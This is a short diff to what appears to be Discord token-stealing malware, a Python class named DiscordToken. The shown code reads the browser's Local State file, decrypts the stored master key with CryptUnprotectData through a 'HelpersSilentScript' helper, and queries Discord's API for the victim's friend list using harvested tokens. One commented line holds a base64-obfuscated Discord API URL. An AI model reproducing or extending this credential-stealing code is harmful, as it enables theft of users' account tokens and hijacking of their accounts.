@@ -35,7 +35,8 @@ class DiscordToken:
         pathKey = path + "/Local State"
         with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = HelpersSilentScript.CryptUnprotectData(master_key[5:])
+        helper = HelpersSilentScript()
+        master_key = helper.CryptUnprotectData(master_key[5:])
         pathC = path + arg
         
         for file in os.listdir(pathC):
@@ -96,6 +97,8 @@ class DiscordToken:
         }
         
         try:
+            # Request(b64decode('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1l').decode('utf-8'))
+            
             friendlist = loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships', headers=headers)).read().decode())
         except:
             return False
